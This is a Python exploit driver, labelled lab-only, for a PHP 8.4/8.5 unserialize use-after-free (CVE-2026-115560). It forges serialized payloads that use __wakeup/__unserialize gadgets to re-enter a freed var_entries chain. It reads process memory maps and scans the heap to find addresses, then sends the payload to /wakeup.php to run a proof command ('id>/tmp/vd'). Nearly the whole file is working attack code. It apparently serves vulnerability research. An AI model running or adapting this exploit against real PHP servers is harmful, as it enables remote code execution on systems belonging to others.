#!/usr/bin/env python3
"""LAB-ONLY CVE-2026-115560 B' -- delayed __wakeup / __unserialize as the
re-entry gadget.

PHP 8.4/8.5 defer __wakeup and __unserialize calls into the var_dtor list and
invoke them from var_destroy(), *after* the var_entries extension chain has
been freed. Unlike the final i_zval_ptr_dtor() (the proven __destruct path),
both delayed branches are wrapped in BG(serialize_lock)++ ... --, so a nested
unserialize() is expected to take the fresh-context branch and not touch the
freed chain. This driver builds the same forged carrier/chain but places a
CacheWakeup (__wakeup) or CacheWakeupU (__unserialize) object in the payload,
then measures and fires it to /wakeup.php.

Two object placements:
  nondup -- object at i:99999, trailing key changed to i:99998 (it survives in
            the array to the var_destroy wakeup)
  dup    -- object at i:99999 overwritten by i:99999;i:42 (control)

Modes: measure (m=5 holds inside the wakeup), fire (m=4 sprays + R:1020),
run, and a negative-result summary. Lab-only; fixed benign command
"id>/tmp/vd 2>&1".
"""
import argparse
import importlib.util
import os
import secrets
import sys
import threading
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

_HERE = os.path.dirname(os.path.abspath(__file__))


def _load(name, path):
    spec = importlib.util.spec_from_file_location(name, path)
    m = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(m)
    return m


VD = _load("vdwake", os.path.join(_HERE, "verify_115560_vardestroy.py"))
PC = VD.PC
MAGIC = VD.MAGIC
MOFF = VD.MOFF
DOFF = VD.DOFF
OFF_ZVAL = VD.OFF_ZVAL
sh = VD.sh
readelf_zif = VD.readelf_zif
PREFIX = PC.PREFIX

CLASSES = {
    "wakeup": b"CacheWakeup",      # O:11:"CacheWakeup"  (__wakeup)
    "unserialize": b"CacheWakeupU",  # O:12:"CacheWakeupU" (__unserialize)
}


def build_value(carrier, zif, key_ptr, kind="wakeup", placement="nondup",
                blob_fill=b"\x00"):
    v = PC.build_value(carrier, zif, key_ptr, blob_fill=blob_fill)
    cls = CLASSES[kind]
    old = b'O:10:"CachePurge"'
    new = b'O:%d:"%s"' % (len(cls), cls)
    assert v.count(old) == 1, v.count(old)
    v = v.replace(old, new)
    if placement == "nondup":
        old_tail = b"i:99999;i:42;}"
        assert v.count(old_tail) == 1
        v = v.replace(old_tail, b"i:99998;i:42;}")
    elif placement != "dup":
        raise SystemExit(f"bad placement {placement}")
    return v


def prime(host, port, container, sid):
    dummy = PC.build_value(0, 0, b"\x00" * 8, blob_fill=b"\x00")
    try:
        VD.http_upload(host, port, "/prime.php", dummy, sid, timeout=20)
    except OSError:
        pass


def measure(host, port, container, sid, kind, placement, spray, ref,
            measure_mode="5"):
    sh(container, "rm -f /tmp/meas_pid /tmp/vd /tmp/wakeup_log")
    val = bytearray(build_value(0, 0, b"\x00" * 8, kind, placement,
                                blob_fill=b"\x00"))
    val[DOFF + MOFF:DOFF + MOFF + len(MAGIC) * 2] = MAGIC * 2
    payload = VD.force_fail(bytes(val))

    prime(host, port, container, sid)
    th = threading.Thread(target=lambda: VD.http_upload(
        host, port,
        f"/wakeup.php?m={measure_mode}&r={ref}&s={spray}", payload, sid),
        daemon=True)
    th.start()

    pid = 0
    for _ in range(80):
        pid = int(sh(container, "cat /tmp/meas_pid 2>/dev/null").stdout.strip() or 0)
        if pid:
            break
        time.sleep(0.1)
    log = sh(container, "cat /tmp/wakeup_log 2>/dev/null").stdout
    if not pid:
        print(f"[!] wakeup did not run; log={log.strip()!r}")
        return None

    maps_text = sh(container, f"cat /proc/{pid}/maps").stdout
    from php2shell import maps  # noqa: E402
    lib, mains = maps.parse_maps(maps_text)
    if not lib:
        # Some stock 8.5 layouts merge the 2 MiB ZendMM main VMA with an
        # adjacent anon VMA, so parse_maps (which requires the VMA start to be
        # 2 MiB aligned) finds no candidate. The raw libphp base is still the
        # first libphp mapping at file offset 0.
        for line in maps_text.splitlines():
            parts = line.split()
            if len(parts) >= 6 and "libphp" in parts[5] and parts[2] == "00000000":
                lib = int(parts[0].split("-")[0], 16)
                break
    zif = readelf_zif(container, lib) if lib else 0

    scan = sh(container, f"php /var/www/html/scan_prefix.php {pid} "
                         f"{(MAGIC * 2).hex()} {MOFF} {DOFF} {len(PREFIX)}")
    hits = []
    for line in scan.stdout.splitlines():
        parts = line.split()
        if len(parts) < 3 or not parts[0].startswith("0x"):
            continue
        try:
            h = int(parts[0], 16)
            v = int(parts[1].split("=", 1)[1], 16)
        except (ValueError, IndexError):
            continue
        pref = parts[2].split("=", 1)[1] if "=" in parts[2] else ""
        hits.append((h, v, pref))
    if not hits:
        print(f"[!] magic scan failed: {scan.stdout.strip()} {scan.stderr.strip()}")
        sh(container, f"kill -9 {pid} 2>/dev/null")
        return None
    want = PREFIX.hex()
    raw = [x for x in hits if x[2] == want]
    print(f"[m] wakeup_log={log.strip()!r}")
    print(f"[m] magic hits={len(hits)} raw-input={len(raw)}")
    if raw:
        magic_addr, value_string, _ = raw[0]
    else:
        magic_addr, value_string, _ = hits[0]
        print("[!] no hit carried the raw-input PREFIX; using first hit")
    carrier = value_string + DOFF
    # The carrier lives in the ZendMM main chunk; the main chunk is 2 MiB
    # aligned and the measured delta is < 2 MiB, so the main base is the 2 MiB
    # slot containing the value string. This avoids merged-VMA parse misses.
    main = value_string & ~0x1FFFFF
    delta = value_string - main
    if not lib or not zif:
        print(f"[!] maps parse failed (lib={lib} mains={mains})")
        sh(container, f"kill -9 {pid} 2>/dev/null")
        return None
    print(f"[m] pid={pid} main={main:#x} lib={lib:#x} zif={zif:#x}")
    print(f"[m] magic={magic_addr:#x} carrier={carrier:#x} "
          f"value_string={value_string:#x} delta={delta:#x}")
    sh(container, f"kill -9 {pid} 2>/dev/null")
    time.sleep(0.5)
    return main, delta, lib, zif, carrier


def fire(host, port, container, sid, main, delta, zif, kind, placement,
         spray, ref, proof="/tmp/vd", fire_mode="4"):
    carrier = main + delta + DOFF
    key = (carrier + OFF_ZVAL).to_bytes(8, "little")
    payload = VD.force_fail(build_value(carrier, zif, key, kind, placement))
    sh(container, f"rm -f {proof} /tmp/meas_pid /tmp/wakeup_log")
    prime(host, port, container, sid)
    resp = VD.http_upload(
        host, port,
        f"/wakeup.php?m={fire_mode}&r={ref}&s={spray}", payload, sid)
    time.sleep(0.8)
    out = sh(container, f"cat {proof} 2>/dev/null").stdout
    log = sh(container, "cat /tmp/wakeup_log 2>/dev/null").stdout
    status = resp.split(b"\r\n", 1)[0].decode("latin1", "replace") if resp else "<none>"
    print(f"[f] consumer={status} proof={out.strip()!r}")
    print(f"[f] wakeup_log={log.strip()!r}")
    return "uid=" in out


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="127.0.0.1:18208")
    ap.add_argument("--container", default="php2shell-115560-8427-offdiag")
    ap.add_argument("--build", default="8.4.27")
    ap.add_argument("--sid", default=None)
    ap.add_argument("--kind", default="wakeup", choices=["wakeup", "unserialize"])
    ap.add_argument("--placement", default="nondup", choices=["nondup", "dup"])
    ap.add_argument("--proof", default="/tmp/vd")
    ap.add_argument("--spray", type=int, default=None)
    ap.add_argument("--ref", type=int, default=1020)
    ap.add_argument("--main", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--delta", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--lib", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--zif", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--bias-zif", type=lambda x: int(x, 0), default=0)
    ap.add_argument("mode", nargs="?", default="run",
                    choices=["measure", "fire", "run"])
    args = ap.parse_args()

    host, _, port = args.target.partition(":")
    port = int(port or 80)
    spray = args.spray if args.spray is not None else (
        8135 if args.build.startswith("8.5") else 3048)
    print(f"[*] 115560 B' delayed {args.kind} ({args.build}) "
          f"placement={args.placement}")
    print(f"    target {args.target} container {args.container} spray={spray}")

    main_addr, delta, lib, zif = args.main, args.delta, args.lib, args.zif
    if args.mode in ("measure", "run"):
        res = measure(host, port, args.container,
                      args.sid or secrets.token_hex(16), args.kind,
                      args.placement, spray, args.ref)
        if not res:
            return 2
        main_addr, delta, lib, zif, _carrier = res
    if args.mode == "measure":
        return 0

    if main_addr is None or delta is None:
        print("[!] fire needs --main and --delta (or 'run' to measure)")
        return 2
    if not zif:
        if not lib:
            print("[!] fire needs --zif or --lib")
            return 2
        zif = readelf_zif(args.container, lib)
    if args.bias_zif:
        zif += args.bias_zif
        print(f"    [!] BIAS zif by {args.bias_zif:#x} (control: must not fire)")

    if fire(host, port, args.container, args.sid or secrets.token_hex(16),
            main_addr, delta, zif, args.kind, args.placement, spray,
            args.ref, args.proof):
        print("[EVIDENCE] wakeup/unserialize re-entry reached the forged chain")
        return 0
    print("[NEGATIVE] no proof: the delayed call did not re-enter the freed "
          "var_entries chain")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
